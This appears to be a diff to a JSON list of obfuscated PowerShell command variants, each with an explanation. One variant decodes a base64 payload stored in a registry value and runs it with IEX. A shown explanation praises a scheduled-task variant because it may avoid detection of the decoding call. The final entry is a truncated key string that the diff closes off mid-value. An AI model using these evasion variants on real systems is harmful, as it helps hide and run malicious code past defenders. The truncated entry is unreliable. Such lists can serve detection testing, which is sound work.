@@ -1,4 +1,3 @@
-```json
 [
   {
     "output": "\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion).Debug)))\"",
@@ -21,4 +20,6 @@
     "explanation": "This command uses a scheduled task to execute the encoded PowerShell command, which introduces additional obfuscation through task scheduling and may avoid direct detection of the FromBase64String function in the immediate command line."
   },
   {
-    "output": "\"powershell.exe\" & { $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp
+    "output": "\"powershell.exe\" & { $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp"
+  }
+]
